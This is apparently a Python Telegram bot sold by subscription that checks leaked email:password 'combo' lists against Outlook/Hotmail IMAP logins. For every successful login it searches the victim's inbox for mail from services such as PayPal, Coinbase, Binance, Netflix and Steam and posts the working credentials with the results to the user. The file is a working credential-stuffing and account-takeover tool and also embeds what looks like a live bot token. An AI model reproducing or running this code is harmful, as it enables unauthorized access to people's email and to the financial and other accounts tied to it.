import telebot
import imaplib
import json
import email
from email.header import decode_header
from datetime import datetime
import time
from threading import Thread

API_TOKEN = '7506099142:AAFXV_tgveZ2Sn4E7lmps021AWkzycN_5gI'  # Replace with your actual API token
Admin = ['1686840395', '123456789']  # List of admin user IDs
bot = telebot.TeleBot(API_TOKEN)  # Initialize the Telegram bot with the API token

# Load subscriber data from JSON file
with open('hotmail.json', 'r') as file:
    data = json.load(file)
    subscribers = {subscriber['id']: subscriber['expiry_date'] for subscriber in data['subscribers']}

# Handler for the /start command
@bot.message_handler(commands=["start"])
def start(message):
    chat_id = str(message.chat.id)
    if chat_id not in subscribers:
        bot.reply_to(message, "This bot is not free. Ask the shravani to get access.")
        return

    expiry_date_str = subscribers[chat_id]
    expiry_date = datetime.strptime(expiry_date_str, '%Y-%m-%d')
    current_date = datetime.now()

    if current_date > expiry_date:
        bot.reply_to(message, "Sorry, your premium subscription has expired.")
    else:
        bot.reply_to(message, "Drop a combo here and let me do the magic 🪄")

# Function to check if login credentials are valid
def check_login(email, password):
    try:
        mail = imaplib.IMAP4_SSL('imap-mail.outlook.com')
        mail.login(email, password)
        mail.logout()
        return True
    except imaplib.IMAP4.error:
        return False

# Function to count the number of emails from specific senders and get the last message
def check_inbox_count(email_address, password):
    try:
        mail = imaplib.IMAP4_SSL("imap-mail.outlook.com")
        mail.login(email_address, password)
        mail.select("inbox")

        # Define the list of senders to check
        senders = {
            "Instagram": "Instagram",
            "Netflix": "Netflix",
            "Google": "google",
            "Yahoo": "yahoo",
            "Microsoft": "microsoft",
            "Apple": "apple",
            "WordPress": "wordpress",
            "Adobe": "adobe",
            "Coursera": "coursera",
            "Twitter": "twitter",
            "LinkedIn": "linkedin",
            "Spotify": "@spotify",
            "PayPal": "paypal",
            "Amazon": "mazon",
            "Steam": "steampowered",
            "Facebook": "facebook",
            "Coinbase": "coinbase",
            "Binance": "binance",
            "Supercell": "supercell",
            "Rockstar": "rockstar",
            "TikTok": "tiktok"
        }

        counts_and_last_message = {}

        # Check inbox for each sender
        for service, sender in senders.items():
            status, messages = mail.search(None, f'FROM "{sender}"')
            if status == "OK":
                email_ids = messages[0].split()
                counts_and_last_message[service] = {
                    "count": len(email_ids),
                    "last_message": None,
                    "date_time": None
                }
                if email_ids:
                    latest_email_id = email_ids[-1]
                    res, msg_data = mail.fetch(latest_email_id, "(RFC822)")
                    for response_part in msg_data:
                        if isinstance(response_part, tuple):
                            msg = email.message_from_bytes(response_part[1])
                            subject, encoding = decode_header(msg["Subject"])[0]
                            if isinstance(subject, bytes):
                                subject = subject.decode(encoding if encoding else "utf-8")
                            date_tuple = email.utils.parsedate_tz(msg["Date"])
                            if date_tuple:
                                local_date = datetime.fromtimestamp(email.utils.mktime_tz(date_tuple))
                                date_time_str = local_date.strftime("%Y-%m-%d %H:%M:%S")
                            counts_and_last_message[service]["last_message"] = subject
                            counts_and_last_message[service]["date_time"] = date_time_str

        mail.logout()
        return counts_and_last_message

    except Exception as e:
        return str(e)

# Function to process each line of the file
def process_line(chat_id, line):
    try:
        email, password = line.split(':')
        if check_login(email, password):
            result = check_inbox_count(email, password)
            if isinstance(result, dict):
                response_parts = []
                for service, details in result.items():
                    if details["count"] > 0:
                        response_parts.append(f"{service}: {details['count']} emails")
                        if details["last_message"] and details["date_time"]:
                            response_parts.append(f"Last Message: {details['last_message']} at {details['date_time']}")
                if response_parts:
                    response = "\n".join(response_parts)
                    bot.send_message(chat_id, f"「 𝗛ᴏᴛ𝗺𝗮𝗶ʟ 𝗛ɪ𝘁 」\n➭ {email}:{password}\n━━━━━━━━[𝗜𝗡𝗕𝗢𝗫 📥]━━━━━━━━\n{response}\n━━━━━━━━━━━━━━━━━━━━━━━\nʙᴏᴛ ʙʏ: .")
                else:
                    bot.send_message(chat_id, f"Hotmail Hit\n\n{email}:{password}\nNo emails found for service senders.")
            else:
                bot.send_message(chat_id, f"Hotmail Hit\n\n{email}:{password}\nError: {result}")
            return True
        else:
            # bot.send_message(chat_id, f"Failed login for: {email}")
            return False
    except ValueError:
        bot.send_message(chat_id, "Invalid format. Expected format: email:password")
        return False
    except Exception as e:
        bot.send_message(chat_id, f"An error occurred: {e}")
        return False

# Function to process the document content
def process_document(chat_id, file_content):
    total_lines = len(file_content)
    successful_logins = 0
    failed_logins = 0
    global checking_message
    checking_message = bot.send_message(chat_id, "Processing started...")

    start_time = time.time()

    for i, line in enumerate(file_content):
        line = line.strip()
        if line:
            success = process_line(chat_id, line)
            if success:
                successful_logins += 1
            else:
                failed_logins += 1

            elapsed_time = time.time() - start_time
            result_message = f"𓄵 𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀...\n\n➱ Total Lines = {total_lines}\n➱ Processed = {i+1}\n➱ Hits = {successful_logins}\n➱ Failed = {failed_logins}\n➱ Time Taken = {elapsed_time:.2f}s"
            bot.edit_message_text(result_message, chat_id, checking_message.message_id)

    final_result_message = f"𝙍𝙚𝙨𝙪𝙡𝙩𝙨 𝘾𝙖𝙥𝙩𝙪𝙧𝙚𝙙 🐾\n➱ 𝖳𝗈𝗍𝖺𝗅 𝖫𝗂𝗇𝖾𝗌 = {total_lines}\n➱ 𝖧𝗂𝗍𝗌 = {successful_logins}\n➱ 𝖥𝗎𝖼𝗄𝗲𝗱 = {failed_logins}\n➱ 𝖳𝗂𝗆𝖾 𝖳𝖺𝗄𝖾𝗇 = {elapsed_time:.2f}s\n\nᗷᗝ丅 ᗷƳ: ."
    bot.edit_message_text(final_result_message, chat_id, checking_message.message_id)

# Handler for document uploads
@bot.message_handler(content_types=['document'])
def handle_document(message):
    if str(message.chat.id) not in subscribers:
        return
    global checking_message
    checking_message = bot.reply_to(message, "⛗ 𝙋𝙚𝙣𝙙𝙞𝙣𝙜...\n 𝖯𝗅𝖾𝖺𝗌𝖾 𝗐𝖺𝗂𝗍 𝗂𝗍 𝗆𝖺𝗒 𝗍𝖺𝗄𝖾 𝗍𝗂𝗆𝖾. 𝖨 𝗐𝗂𝗅𝗅 𝗂𝗇𝖿𝗈𝗋𝗆 𝗒𝗈𝗎 𝗐𝗁𝖾𝗇 𝖼𝗈𝗆𝗉𝗅𝖾𝗍𝖾𝖽 |")

    file_info = bot.get_file(message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    file_content = downloaded_file.decode('utf-8').strip().split('\n')

    # Ensure to process the file in a separate thread to avoid blocking
    process_thread = Thread(target=process_document, args=(message.chat.id, file_content))
    process_thread.start()

bot.polling()
